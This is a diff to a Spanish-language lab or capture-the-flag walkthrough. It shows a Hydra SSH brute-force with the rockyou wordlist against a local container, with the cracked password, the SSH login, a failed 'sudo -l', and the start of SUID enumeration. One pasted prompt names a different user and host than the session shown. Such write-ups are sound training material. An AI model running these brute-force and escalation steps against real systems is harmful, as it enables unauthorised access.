@@ -180,7 +180,54 @@ Podemos observar que el login anónimo ha dado resultado y nos hemos encontrado 
 ```
 En el primer archivo nos encontramos con lo que parece un chat entre dos usuarios de sistema, *Gonza* y *Russoski*.  Por el uso de la primera persona del singular puedo interpretar que estamos tomando el papel de Russoski.  Además, en el segundo archivo se nos esta desvelando que con este usuario de sistema tenemos unos permisos habilitados así que, vamos a probar en el servicio *OpenSSH*.
 
+Haremos uso de la herramienta de fuerza bruta [Hydra](https://github.com/vanhauser-thc/thc-hydra) utilizando *russoski* como nombre de usuario y el diccionario [rockyou](https://github.com/topics/rockyou-wordlist) para comprobar contraseñas.
+```py
+❯ hydra -l russoski -P /usr/share/wordlists/rockyou.txt -f ssh://172.17.0.2
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-16 12:53:49
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://172.17.0.2:22/
+[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
+[STATUS] attack finished for 172.17.0.2 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-16 12:54:21
+```
+* Con -l seleccionamos el usuario.
+* Con -P indicamos un conjunto de contraseñas a probar, en este caso, las recogidas en el diccionario.
+* Por último indicamos el servicio y la dirección sobre la que ejecutar el ataque.
+
+Vemos que este ataque ha sido satisfactorio y hemos encontrado una contraseña válida para el usuario *russoski*.
+Ahora que ya tenemos usuario y contraseña accederemos al servicio SSH para comenzar con el escalado de privilegios.
+```ruby
+❯ ssh russoski@172.17.0.2
+russoski@172.17.0.2's password: 
+Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.12.38+kali-amd64 x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Tue Sep 16 13:15:06 2025 from 172.17.0.1
+russoski@9cc448a7c0a7:~$ whoami
+russoski
+``` 
+
+Para continuar, vamos a intentar listar todos los privilegios de *sudo* del usuario actual. Es decir, mostrar qué comandos puede ejecutar con sudo y cómo.
+```ruby
+lovely@90f44a27e698:~$ sudo -l
+-bash: sudo: command not found
+```
+Vemos que nos ha devuelto que el comando *sudo* no se ha encontrado así que no listaremos permisos de sudoers.  Esto puede ser por:
+* El sistema está minimalista (por ejemplo, contenedores, sistemas de pruebas, o ciertos servidores SSH).
+* Tu usuario no tiene permisos para sudo, o sudo no está instalado.
+
+La siguiente opción es buscar permisos SUID.  El SUID (Set User ID) es un bit especial de permisos en sistemas tipo Unix/Linux que se aplica a archivos ejecutables. Su función principal es permitir que un programa se ejecute con los permisos del propietario del archivo, en lugar de los permisos del usuario que lo ejecuta. Esto puede ser útil para ciertas tareas que requieren privilegios elevados, sin dar acceso completo al usuario.  Para ello ejecutaremos: 
 
 
 
